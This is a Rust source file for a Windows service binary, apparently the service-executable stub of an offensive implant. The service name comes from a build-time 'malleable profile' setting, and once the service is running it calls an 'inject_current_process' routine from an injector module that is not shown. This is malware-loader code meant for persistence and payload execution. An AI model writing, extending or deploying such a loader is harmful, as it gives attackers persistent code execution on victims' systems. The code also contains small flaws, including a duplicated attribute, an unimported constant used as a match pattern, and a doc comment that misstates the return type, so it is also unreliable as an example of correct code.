#![no_std]
#![no_main]
#![cfg_attr(not(test), windows_subsystem = "windows")]
#![no_main]

use crate::injector::inject_current_process;
use windows_sys::{
    Win32::{
        Foundation::{ERROR_SUCCESS, FALSE},
        System::Services::{
            RegisterServiceCtrlHandlerW, SERVICE_RUNNING, SERVICE_STATUS,
            SERVICE_STATUS_CURRENT_STATE, SERVICE_STATUS_HANDLE, SERVICE_TABLE_ENTRYW,
            SERVICE_WIN32_OWN_PROCESS, SetServiceStatus, StartServiceCtrlDispatcherW,
        },
    },
    core::PWSTR,
};

mod injector;
mod utils;

#[cfg_attr(not(test), panic_handler)]
#[allow(unused)]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

/// Creates a service binary name, based on the malleable profile (or unwrap at comptime). The fn
/// returns a PWSTR (*mut u16) which can be used in place of a PWSTR in windows_sys
fn get_service_name_wide() -> [u16; 256] {
    let mut buf = [0u16; 256];
    static mut INITIALIZED: bool = false;

    let svc_name = option_env!("SVC_NAME").unwrap_or("DefaultService");
    let mut pos = 0;

    for c in svc_name.encode_utf16() {
        if pos < 255 {
            buf[pos] = c;
            pos += 1;
        }
    }
    buf[pos] = 0;

    buf
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
    svc_start();
}

fn svc_start() {
    let mut svc_name = get_service_name_wide();
    // register the service with SCM
    let h_svc = unsafe {
        RegisterServiceCtrlHandlerW(PWSTR::from(svc_name.as_mut_ptr()), Some(service_handler))
    };
    if h_svc.is_null() {
        return;
    }

    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }

    inject_current_process();
}

unsafe extern "system" fn service_handler(control: u32) {
    match control {
        SERVICE_CONTROL_STOP => (),
        _ => {}
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn main() -> i32 {
    let mut svc_name = get_service_name_wide();

    let service_table = [
        SERVICE_TABLE_ENTRYW {
            lpServiceName: PWSTR::from(svc_name.as_mut_ptr()),
            lpServiceProc: Some(ServiceMain),
        },
        SERVICE_TABLE_ENTRYW::default(),
    ];

    unsafe {
        if StartServiceCtrlDispatcherW(service_table.as_ptr()) == FALSE {
            return 1;
        }
    }

    0
}

pub unsafe fn update_service_status(h_status: SERVICE_STATUS_HANDLE, state: u32) {
    let mut service_status = SERVICE_STATUS {
        dwServiceType: SERVICE_WIN32_OWN_PROCESS,
        dwCurrentState: SERVICE_STATUS_CURRENT_STATE::from(state),
        dwControlsAccepted: if state == SERVICE_RUNNING { 1 } else { 0 },
        dwWin32ExitCode: ERROR_SUCCESS,
        dwServiceSpecificExitCode: 0,
        dwCheckPoint: 0,
        dwWaitHint: 0,
    };

    unsafe {
        let _ = SetServiceStatus(h_status, &mut service_status);
    }
}
